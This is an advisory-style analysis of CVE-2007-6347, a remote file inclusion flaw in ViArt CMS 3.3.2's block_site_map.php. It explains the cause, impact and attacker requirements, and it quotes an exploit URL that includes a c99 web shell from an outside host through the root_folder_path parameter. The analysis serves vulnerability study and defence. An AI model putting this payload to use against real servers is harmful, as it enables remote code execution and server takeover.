Based on the provided content, here's an analysis of CVE-2007-6347:

**Root cause of vulnerability:**
- The vulnerability stems from a lack of proper input sanitization in the `root_folder_path` parameter of the `block_site_map.php` file in ViArt CMS 3.3.2. Specifically, the `include_once()` function includes the file path provided by this parameter.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The application directly includes a file based on user-supplied input without proper validation. This allows for the inclusion of remote files by specifying a URL in the `root_folder_path` parameter.

**Impact of exploitation:**
- **Arbitrary Code Execution:** By including a remote file containing malicious code, an attacker can execute arbitrary PHP code on the server, leading to complete compromise of the web server and its data.

**Attack vectors:**
- **HTTP GET request:** The vulnerability can be exploited through a crafted HTTP GET request by providing a malicious URL to the `root_folder_path` parameter within the request to the vulnerable script: `block_site_map.php`.
  
**Required attacker capabilities/position:**
- **Network access:** The attacker needs network access to the vulnerable server. 
- **Malicious PHP file Hosting:** The attacker must have a server to host the malicious PHP file.
- **Knowledge of the vulnerable component:** The attacker needs to know the vulnerable script path (`block_site_map.php`) and the vulnerable parameter (`root_folder_path`).

**Exploit Details:**
The provided exploit code shows how to exploit the vulnerability:
```
www.RxH.com/viart_cms-3.3.2/blocks/block_site_map.php?root_folder_path=http://no-hack.fr/shell/c99.txt?
```
This URL, when accessed, forces the `block_site_map.php` script to include the remote file located at `http://no-hack.fr/shell/c99.txt`, enabling the attacker to execute the code within the remote file.
